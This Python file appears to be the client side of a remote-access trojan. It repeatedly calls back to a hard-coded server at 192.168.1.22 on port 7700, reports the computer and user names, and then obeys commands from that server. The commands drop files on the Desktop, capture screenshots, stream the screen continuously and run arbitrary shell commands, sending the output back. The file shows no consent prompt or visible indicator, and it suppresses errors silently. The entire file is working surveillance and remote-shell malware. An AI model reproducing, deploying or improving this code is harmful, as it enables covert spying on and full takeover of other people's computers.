
import socket
import json
import os
import platform
import base64
import threading
import time
import subprocess
from PIL import Image, ImageGrab
import io

SERVER_IP = "192.168.1.22"
SERVER_PORT = 7700

def get_info():
    return {
        "computer": platform.node(),
        "user": os.getlogin(),
        "os": platform.platform()
    }

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))
            
            # Send info
            sock.send(json.dumps(get_info()).encode())
            
            current_dir = os.path.expanduser("~")
            
            # Receive commands
            while True:
                data = sock.recv(1024*1024)
                if not data:
                    break
                    
                try:
                    command = json.loads(data.decode())
                    
                    if command["action"] == "upload_file":
                        # Save file to desktop
                        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
                        filepath = os.path.join(desktop, command["filename"])
                        
                        # Decode and save
                        file_data = base64.b64decode(command["data"])
                        with open(filepath, "wb") as f:
                            f.write(file_data)
                    
                    elif command["action"] == "screenshot":
                        # Capture screenshot
                        try:
                            screenshot = ImageGrab.grab()
                            img_buffer = io.BytesIO()
                            screenshot.save(img_buffer, format='PNG')
                            img_data = base64.b64encode(img_buffer.getvalue()).decode()
                            
                            response = {
                                "action": "screenshot_data",
                                "image": img_data,
                                "width": screenshot.width,
                                "height": screenshot.height
                            }
                            sock.send(json.dumps(response).encode())
                            
                        except Exception as e:
                            response = {
                                "action": "screenshot_error",
                                "error": f"Screenshot failed: {str(e)}"
                            }
                            sock.send(json.dumps(response).encode())
                    
                    elif command["action"] == "start_screen":
                        # Start screen streaming
                        streaming_active = True
                        selected_quality = command.get("quality", "medium")
                        
                        def stream_screen(quality):
                            nonlocal streaming_active
                            try:
                                # Set quality parameters
                                if quality == "low":
                                    quality_param = (800, 600)
                                    jpeg_quality = 70
                                    fps_delay = 0.05  # 20 FPS
                                elif quality == "high":
                                    # Use native resolution or high HD
                                    quality_param = (1920, 1080) 
                                    jpeg_quality = 95
                                    fps_delay = 0.033  # 30 FPS
                                else:  # medium
                                    quality_param = (1280, 720)
                                    jpeg_quality = 85
                                    fps_delay = 0.05  # 20 FPS
                                
                                while streaming_active:
                                    try:
                                        start_time = time.time()
                                        
                                        # Capture screenshot
                                        screenshot = ImageGrab.grab()
                                        
                                        # Resize only if necessary to save CPU
                                        if quality != "high":
                                            screenshot = screenshot.resize(quality_param, Image.Resampling.BILINEAR)
                                        
                                        # Compress and encode with high performance settings
                                        img_buffer = io.BytesIO()
                                        screenshot.save(img_buffer, format='JPEG', quality=jpeg_quality, optimize=False)
                                        img_data = base64.b64encode(img_buffer.getvalue()).decode()
                                        
                                        # Send response
                                        response = {
                                            "action": "screen_data",
                                            "image": img_data,
                                            "width": screenshot.width,
                                            "height": screenshot.height
                                        }
                                        sock.send(json.dumps(response).encode())
                                        
                                        # Calculate remaining time for consistent FPS
                                        elapsed = time.time() - start_time
                                        sleep_time = max(0, fps_delay - elapsed)
                                        time.sleep(sleep_time)
                                        
                                    except Exception as e:
                                        if streaming_active:
                                            error_response = {
                                                "action": "screen_error",
                                                "error": f"Streaming error: {str(e)}"
                                            }
                                            try:
                                                sock.send(json.dumps(error_response).encode())
                                            except:
                                                pass
                                        break
                                        
                            except Exception as e:
                                error_response = {
                                    "action": "screen_error", 
                                    "error": f"Failed to start streaming: {str(e)}"
                                }
                                try:
                                    sock.send(json.dumps(error_response).encode())
                                except:
                                    pass
                        
                        # Start streaming in separate thread with quality parameter
                        streaming_thread = threading.Thread(target=stream_screen, args=(selected_quality,), daemon=True)
                        streaming_thread.start()
                    
                    elif command["action"] == "stop_screen":
                        # Stop screen streaming
                        streaming_active = False
                    
                    elif command["action"] == "execute_cmd":
                        cmd_to_execute = command["command"].strip()
                        
                        try:
                            lower = cmd_to_execute.lower()
                            if lower == "cd" or lower.startswith("cd ") or lower == "cd.." or lower.startswith("cd.."):
                                target = None
                                if lower == "cd" or lower == "cd~":
                                    target = os.path.expanduser("~")
                                elif lower == "cd.." or lower == "cd ..":
                                    target = os.path.abspath(os.path.join(current_dir, ".."))
                                elif lower.startswith("cd.."):
                                    target = os.path.abspath(os.path.join(current_dir, ".."))
                                else:
                                    path = cmd_to_execute[3:].strip()
                                    if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
                                        path = path[1:-1]
                                    path = os.path.expanduser(path)
                                    target = path if os.path.isabs(path) else os.path.abspath(os.path.join(current_dir, path))
                                if target and os.path.isdir(target):
                                    current_dir = target
                                    response = {
                                        "action": "cmd_output",
                                        "output": current_dir + "\n",
                                        "error": ""
                                    }
                                else:
                                    response = {
                                        "action": "cmd_output",
                                        "output": "",
                                        "error": "The system cannot find the path specified."
                                    }
                                sock.send(json.dumps(response).encode())
                                continue
                            result = subprocess.run(
                                cmd_to_execute,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30,
                                cwd=current_dir
                            )
                            
                            # Prepare response
                            response = {
                                "action": "cmd_output",
                                "output": result.stdout if result.stdout else "",
                                "error": result.stderr if result.stderr else ""
                            }
                            
                            # Send response back
                            sock.send(json.dumps(response).encode())
                            
                        except subprocess.TimeoutExpired:
                            response = {
                                "action": "cmd_output",
                                "output": "",
                                "error": "Command timeout (30 seconds)"
                            }
                            sock.send(json.dumps(response).encode())
                        except Exception as e:
                            response = {
                                "action": "cmd_output",
                                "output": "",
                                "error": str(e)
                            }
                            sock.send(json.dumps(response).encode())
                            
                except:
                    pass
                    
        except:
            time.sleep(5)  # Retry after 5 seconds

if __name__ == "__main__":
    connect()
